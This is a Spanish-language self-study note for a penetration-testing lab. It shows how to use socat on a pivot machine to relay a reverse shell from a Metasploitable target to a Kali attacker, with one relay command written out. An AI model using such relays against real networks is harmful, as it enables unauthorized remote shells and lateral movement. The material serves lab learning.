---
title: "SOCAT"
date: 2026-08-27
tags:
  - self-study
  - security-penetration-testing
  - avanzado
status: verified
author: "Juan José Restrepo Rosero"
last_updated: 2026-08-27
---

Dentro de la máquina Ubuntu intermedia, debemos ejecutar este comando para obtener una reverse shell de la máquina objetivo final hacia la máquina kali atacante, por lo que en primer lugar nos ponemos en escucha con netcat desde la máquina Kali:
![[Pasted image 20230722162103.png]]
Y en la máquina Ubuntu ponemos el siguiente comando:
```bash
socat tcp-l:443,fork,reuseaddr tcp:192.168.0.30:443
```
![[Pasted image 20230722162236.png]]
Y ahora la máquina ubuntu estará preparada para servir como puente y enviar la reverse shell a la kali, de tal forma, que todo el tráfico que reciba la máquina ubuntu por el puerto 443 lo va a enviar a la máquina kali por el mismo puerto, por lo que ahora si ejecutamos el comando para obtener una reverse shell, la habremos recibido desde la metasploitable a la máquina ubuntu:
![[Pasted image 20230722162820.png]]
Y en Kali recibimos la conexión:
![[Pasted image 20230722162833.png]]

<!-- self-study-knowledge-context -->
## Contexto de estudio
- Dominio: [[MOC-Self-Study#Security & Penetration Testing|Seguridad y pruebas de penetración]].
- Criterio de producción: Ejecuta técnicas únicamente en activos propios o con autorización explícita, alcance documentado y controles de no afectación.
> [!warning] Uso autorizado
> Este material es exclusivamente educativo y defensivo. Practica en laboratorios aislados, CTFs o sistemas para los que dispongas de autorización previa y explícita.
